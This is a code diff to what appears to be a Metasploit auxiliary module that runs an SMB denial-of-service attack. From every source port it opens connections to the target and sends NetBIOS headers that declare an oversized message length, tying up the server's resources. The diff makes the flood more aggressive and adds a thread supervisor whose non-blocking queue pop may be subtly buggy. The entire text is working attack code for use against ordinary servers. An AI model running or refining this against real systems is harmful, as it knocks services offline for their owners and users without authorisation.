@@ -4,6 +4,7 @@
 ##
 
 require 'bindata'
+require 'ruby_smb'
 
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::Tcp
@@ -49,6 +50,17 @@ class MetasploitModule < Msf::Auxiliary
     header = NbssHeader.new
     header.message_length = 0x01FFFF
 
+    worker_threads = Queue.new
+
+    supervisor = Thread.new do
+      loop do
+        zombie_thread = worker_threads.pop(true)
+        unless zombie_thread.nil?
+          zombie_thread.kill
+        end
+      end
+    end
+
     linger = Socket::Option.linger(true, 30)
 
     (1..65535).each do |src_port|
@@ -56,26 +68,27 @@ class MetasploitModule < Msf::Auxiliary
       mythr = Thread.new do
         opts = {
           'CPORT'           => src_port,
-          'ConnectTimeout'  => 300
+          'ConnectTimeout'  => 30
         }
 
         begin
+          #nsock = Socket.tcp(rhost, rport, '0.0.0.0' , src_port)
           nsock = connect(false, opts)
           nsock.setsockopt(Socket::SOL_SOCKET, Socket::SO_KEEPALIVE, true)
+          nsock.setsockopt(Socket::SOL_SOCKET, Socket::SO_REUSEADDR, true)
           nsock.setsockopt(linger)
 
-          nsock.put(header.to_binary_s)
+          nsock.write(header.to_binary_s)
         rescue Exception => e
           print_error "Exception sending packet: #{e.message}"
         end
 
       end
-      # select(nil, nil, nil, 0.0001)
-      # mythr.kill
+      worker_threads << mythr
     end
     print_status "Sleeping for 30 seconds..."
     select(nil, nil, nil, 30)
-
+    supervisor.kill
   end
 
 end
